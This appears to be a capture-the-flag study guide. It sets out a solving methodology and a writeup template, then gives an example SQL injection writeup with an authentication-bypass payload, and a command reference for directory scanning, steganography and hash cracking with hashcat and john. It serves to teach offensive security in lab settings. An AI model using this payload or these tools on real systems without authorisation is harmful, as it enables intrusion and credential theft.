# 07 — CTF Writeups: Notes, Templates & Methodology

> Capture The Flag competitions are the fastest way to build offensive skills. This section teaches you how to approach CTFs and document your solutions.

---

## 🔴 CTF Categories

| Category | Skills Tested | Common Challenges |
|----------|--------------|-------------------|
| Web | SQLi, XSS, SSRF, auth bypass | Login bypasses, API abuse, cookie manipulation |
| Pwn (Binary) | Buffer overflow, ROP, format strings | Binary exploitation, shellcode writing |
| Reverse Engineering | Disassembly, decompilation | Crack key generators, analyze malware |
| Crypto | RSA, AES, XOR, hash cracking | Decrypt messages, break weak crypto |
| Forensics | File analysis, network capture, steganography | PCAP analysis, hidden data extraction |
| OSINT | Information gathering | Find people/places from photos, metadata |
| Misc | Anything | Scripting challenges, trivia, puzzles |

---

## 🔴 CTF Approach Methodology

```
1. READ THE CHALLENGE
   ├── What category?
   ├── What's provided? (URL, file, binary, network capture)
   ├── What's the flag format? (flag{...}, CTF{...}, etc.)
   └── Any hints?

2. ENUMERATE
   ├── Web: View source, check cookies, intercept requests, directory scan
   ├── Binary: file, strings, checksec, strace/ltrace, disassemble
   ├── Crypto: Identify cipher, check key length, look for patterns
   ├── Forensics: file, exiftool, binwalk, foremost, volatility
   └── OSINT: Reverse image search, metadata, social media

3. IDENTIFY THE VULNERABILITY
   ├── What's the intended weakness?
   ├── Is this a known pattern? (Google the pattern)
   └── Can you find a CVE or technique writeup?

4. EXPLOIT
   ├── Write/find the exploit
   ├── Adapt for this specific challenge
   └── Capture the flag

5. DOCUMENT
   ├── Write the approach
   ├── Include exact commands/payloads
   ├── Explain WHY it works
   └── Note what you learned
```

---

## 🔴 Writeup Template

```markdown
# [Challenge Name] — [CTF Name] [Year]

## Overview
| Field | Value |
|-------|-------|
| Category | Web / Pwn / Crypto / Forensics / Misc |
| Difficulty | Easy / Medium / Hard |
| Points | 100 |
| Solves | 42 |
| Flag | `flag{example_flag_here}` |

## Description
> [Paste the original challenge description here]

## Reconnaissance

### Initial Analysis
[What did you notice first? What tools did you use to examine the challenge?]

```bash
# Commands you ran during reconnaissance
curl -sI http://challenge.ctf.com
nmap -sV -p- challenge.ctf.com
```

### Key Observations
1. [First important observation]
2. [Second important observation]
3. [What led you to the vulnerability]

## Vulnerability

**Type**: [SQL Injection / Buffer Overflow / Weak Crypto / etc.]

**Location**: [Where the vulnerability exists]

**Root Cause**: [Why the vulnerability exists — what's the developer mistake?]

## Exploitation

### Step 1: [First exploitation step]
```bash
# Exact command or payload
```

[Explain what this does and why]

### Step 2: [Second exploitation step]
```bash
# Exact command or payload
```

[Explain the response and next steps]

### Step 3: [Flag capture]
```bash
# Final command that gets the flag
```

## Flag
```
flag{example_flag_here}
```

## Lessons Learned
- [What new technique did you learn?]
- [What would you do differently next time?]
- [What similar vulnerabilities should you look for in real pentests?]

## References
- [Link to relevant resource]
- [Link to technique documentation]
```

---

## 🔴 Example Writeup: SQL Injection Challenge

```markdown
# EasyLogin — ExampleCTF 2024

## Overview
| Field | Value |
|-------|-------|
| Category | Web |
| Difficulty | Easy |
| Points | 100 |
| Flag | `flag{sql_1nj3ct10n_1s_st1ll_r3al}` |

## Description
> Can you login as admin? http://challenge.ctf.com:8080

## Reconnaissance

### Initial Analysis
Visited the URL — simple login form with username and password fields.

```bash
# Check the technology stack
curl -sI http://challenge.ctf.com:8080
# Server: Apache/2.4.41
# X-Powered-By: PHP/7.4.3
```

Intercepted the login request with Burp:
```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

Response: "Invalid credentials"

### Key Observations
1. PHP backend — likely MySQL database
2. No client-side validation
3. Error response doesn't distinguish between invalid user and invalid password
4. No CSRF token — but not relevant for this challenge

## Vulnerability

**Type**: SQL Injection (Authentication Bypass)
**Location**: `username` parameter in POST /login.php
**Root Cause**: User input concatenated directly into SQL query without parameterization

## Exploitation

### Step 1: Confirm SQL Injection
```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'&password=test
```
Response: MySQL error: "You have an error in your SQL syntax..."
→ SQLi confirmed

### Step 2: Bypass Authentication
```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' OR 1=1-- -&password=anything
```
Response: Redirect to /dashboard.php with flag displayed

## Flag
```
flag{sql_1nj3ct10n_1s_st1ll_r3al}
```

## Lessons Learned
- Always test login forms for SQLi with a single quote first
- PHP + MySQL is a classic SQLi target
- Real-world: This exact vulnerability still exists in production applications
- Prevention: Use parameterized queries / prepared statements
```

---

## 🔴 Quick Command Reference For CTFs

### Web Challenges
```bash
# View source
curl -s TARGET | grep -i "flag\|comment\|hidden\|<!--"

# Check robots.txt
curl TARGET/robots.txt

# Directory scan
gobuster dir -u TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50

# Cookie analysis
curl -v TARGET 2>&1 | grep -i "set-cookie"

# JavaScript analysis
curl -s TARGET | grep -oP 'src="[^"]*\.js"' | while read js; do
  curl -s "$TARGET/$(echo $js | cut -d'"' -f2)" | grep -i "flag\|api_key\|secret"
done
```

### Forensics Challenges
```bash
# Identify file type
file mystery_file
exiftool mystery_file

# Extract hidden data
binwalk mystery_file
binwalk -e mystery_file  # Auto-extract

foremost mystery_file     # Carve files from data
steghide extract -sf image.jpg  # Steganography
zsteg image.png          # PNG steganography
strings mystery_file | grep -i flag

# PCAP analysis
wireshark capture.pcap
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data | grep flag
```

### Crypto Challenges
```bash
# Identify encoding/cipher
# Base64: alphanumeric + /+ and = padding
echo 'dGVzdA==' | base64 -d

# Hex
echo '68656c6c6f' | xxd -r -p

# ROT13
echo 'grfg' | tr 'a-zA-Z' 'n-za-mN-ZA-M'

# XOR (Python)
python3 -c "import binascii; print(binascii.unhexlify(hex(int('hex_ct',16) ^ int('hex_key',16))[2:]))"

# Hash identification
hashid 'HASH_VALUE'
# Or: https://hashes.com/en/tools/hash_identifier

# Hash cracking
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Online: https://crackstation.net/
```

---

## 🔴 CTF Platforms

| Platform | URL | Type | Best For |
|----------|-----|------|----------|
| HackTheBox | hackthebox.com | Machines + Challenges | Real-world pentesting |
| TryHackMe | tryhackme.com | Guided rooms | Learning path |
| PicoCTF | picoctf.org | Challenges | Beginners |
| CTFtime | ctftime.org | CTF calendar | Finding competitions |
| OverTheWire | overthewire.org | Wargames | Linux/Bash skills |
| CryptoHack | cryptohack.org | Challenges | Cryptography |
| pwnable.kr | pwnable.kr | Challenges | Binary exploitation |
| PortSwigger Academy | portswigger.net/web-security | Labs | Web security |

---

## 📋 CTF Toolkit Checklist

```
□ Burp Suite configured
□ Python3 with pwntools, requests, pycryptodome
□ GDB with GEF/peda/pwndbg
□ Ghidra or IDA Free (reverse engineering)
□ CyberChef bookmarked (gchq.github.io/CyberChef)
□ Wireshark installed
□ SecLists downloaded
□ John the Ripper + Hashcat ready
□ Docker available (for isolated environments)
□ Note-taking system ready (markdown, CherryTree)
```
